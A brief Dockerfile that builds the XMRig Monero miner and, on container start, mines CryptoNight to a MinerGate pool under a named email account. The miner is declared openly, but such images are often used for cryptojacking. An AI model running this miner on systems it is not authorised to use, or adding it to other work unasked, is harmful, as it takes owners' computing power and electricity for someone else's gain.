FROM ubuntu:16.04

WORKDIR /app

RUN apt-get update
RUN apt-get install -y git build-essential cmake libuv1-dev libmicrohttpd-dev
RUN git clone https://github.com/xmrig/xmrig.git /app
RUN mkdir /app/build
RUN cmake .
RUN make

ENV POOL=stratum+tcp://xmr.pool.minergate.com:45560
ENV USER=pakokrew@gmail.com

ENTRYPOINT /app/xmrig -a cryptonight -o $POOL -u $USER --print-time=10 --donate-level=1

